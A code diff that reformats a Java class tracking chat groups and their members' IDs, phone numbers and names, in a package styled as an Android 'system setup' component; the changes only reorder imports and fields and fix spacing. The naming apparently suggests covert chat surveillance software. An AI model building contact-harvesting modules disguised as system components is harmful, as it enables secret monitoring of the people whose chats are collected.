@@ -1,11 +1,11 @@
 package com.android.syssetup.module.chat;
 
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.Check;
+
 import java.util.HashSet;
 import java.util.Hashtable;
 import java.util.Set;
-
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.util.Check;
 
 /* Gestore di gruppi di utenti nelle chat */
 public class ChatGroups {
@@ -13,12 +13,10 @@ public class ChatGroups {
 	private static final int F_ID = 0;
 	private static final int F_NUMBER = 1;
 	private static final int F_NAME = 2;
-
-	Contact contact;
-	Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();
-
 	final Hashtable<String, Set<String>> groups = new Hashtable<String, Set<String>>();
 	final Hashtable<String, String> tos = new Hashtable<String, String>();
+	Contact contact;
+	Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();
 
 	public void addLocalToAllGroups(String local) {
 		for (String key : groups.keySet()) {
@@ -90,7 +88,7 @@ public class ChatGroups {
 			if (c != null && !author.equals(c.number) && !author.equals(cid)) {
 				if (field == F_ID) {
 					builder.append(c.id);
-				} else if (field == F_NUMBER){
+				} else if (field == F_NUMBER) {
 					builder.append(c.number);
 				} else {
 					builder.append(c.name);
@@ -122,7 +120,9 @@ public class ChatGroups {
 	/* dato un peer, dice se e' un gruppo */
 	boolean isGroup(String peer) {
 		return true;
-	};
+	}
+
+	;
 
 	/* verifica che il gruppo sia gia' presente */
 	public boolean hasMemoizedGroup(String groupName) {
